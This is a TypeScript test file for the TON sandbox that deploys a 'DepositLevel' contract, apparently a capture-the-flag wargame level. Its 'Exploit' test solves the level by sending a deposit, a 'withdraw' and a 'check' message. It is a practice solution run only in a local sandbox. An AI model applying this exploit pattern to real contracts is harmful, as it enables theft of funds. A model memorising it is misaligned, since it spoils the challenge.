import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { toNano } from '@ton/core';
import { DepositLevel } from '../wrappers/wrappers/DepositLevel';
import '@ton/test-utils';

describe('DepositLevel', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<DepositLevel>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(await DepositLevel.fromInit(player.address, 0n));

        const deployResult = await level.send(
            owner.getSender(),
            {
                value: toNano('0.1'),
            },
            {
                $$type: 'Deploy',
                queryId: 0n,
            },
        );

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: level.address,
            deploy: true,
            success: true,
        });
    });

    it('Exploit', async () => {
        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            null,
        );

        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            'withdraw',
        );

        await level.send(
            player.getSender(),
            {
                value: toNano('0.05'),
            },
            'check',
        );

        expect(await level.getCompleted()).toEqual(true);
    });
});
